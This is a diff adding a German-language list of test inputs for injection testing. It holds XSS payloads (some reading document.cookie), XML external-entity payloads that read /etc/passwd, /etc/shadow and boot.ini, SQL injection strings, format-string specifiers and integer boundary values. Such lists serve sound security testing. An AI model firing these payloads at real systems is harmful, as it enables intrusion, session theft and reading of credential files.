@@ -1,0 +1,120 @@
+Injections
+In dieser Datei sind Eingabewerte, welche Fehlverhalten in einer Anwendung provozieren.
+Diese Eingabewerte sind ausführbarer Code und zielen darauf Fehler bei der Trennung von Code- und Daten zu erzeugen.
+
+Diese Liste kann nach belieben erweitert werden.
+
+
+XSS	
+	<body onload=alert('1')>
+	<b onmouseover=alert('2')>click me!</b>
+	<IMG SRC=j&#X41vascript:alert('3')>
+	<script>alert("4")</script>
+	“><script>alert('5')</script>
+	"><script >alert('6')</script >
+	"><ScRiPt>alert(document.cookie)</ScRiPt>
+	"%3cscript%3ealert('7')%3c/script%3e
+	<scr<script>ipt>alert(document.cookie)</script>
+	aaa@aa.com"><script>alert('8')</script>
+	aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+	;alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+	alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+	></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+	';!--"<XSS>=&{()}
+	
+XML	
+	<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><foo><![CDATA[<]]>
+	SCRIPT<![CDATA[>]]>alert(‘gotcha’);<![CDATA[<]]>/
+	SCRIPT<![CDATA[>]]></foo>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><foo><![CDATA[‘
+	or 1=1 or ‘’=’]]></foof>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file://c:/boot.
+	ini”>]><foo>&xee;</foo>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file:///etc/
+	passwd”>]><foo>&xee;</foo>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
+	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file:///etc/
+	shadow”>]><foo>&xee;</foo>
+	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
+	
+String	
+	%s%p%x%d
+	.1024d
+	%.2049d
+	%p%p%p%p
+	%x%x%x%x
+	%d%d%d%d
+	%s%s%s%s
+	%99999999999s
+	%08x
+	%%20d
+	%%20n
+	%%20x
+	%%20s
+	%s%s%s%s%s%s%s%s%s%s
+	%p%p%p%p%p%p%p%p%p%p
+	%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%-
+	j%z%Z%t%i%e%g%f%a%C%S%08x%%
+	%s x 129
+	
+SQL	
+	‘||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+	||6
+	‘||’6
+	(||6)
+	‘ OR 1=1--
+	OR 1=1
+	‘ OR ‘1’=’1
+	; OR ‘1’=’1’
+	%22+or+isnull%281%2F0%29+%2F*
+	%27+OR+%277659%27%3D%277659
+	%22+or+isnull%281%2F0%29+%2F*
+	%27+--+
+	‘ or 1=1--
+	“ or 1=1--
+	‘ or 1=1 /*
+	or 1=1--
+	‘ or ‘a’=’a
+	“ or “a”=”a
+	‘) or (‘a’=’a
+	Admin’ OR ‘
+	‘%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.
+	TABLES--
+	) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.
+	TABLES
+	
+Integer Overflow	
+	-1
+	0
+	0x100
+	0x1000
+	0x3fffffff
+	0x7ffffffe
+	0x7fffffff
+	0x80000000
+	0xfffffffe
+	0xffffffff
+	0x10000
+	0x100000
+	
+HTML-Zeichen	
+	<     
+	>     
+	(     
+	)     
+	#     
+	&     
+     	&quot;
+	
+JavaScript String Operationen	
+	\n 
+	\r 
+	\' 
+	\" 
+	\\ 
+	\u0198 
+Sonstige
+	[00000]
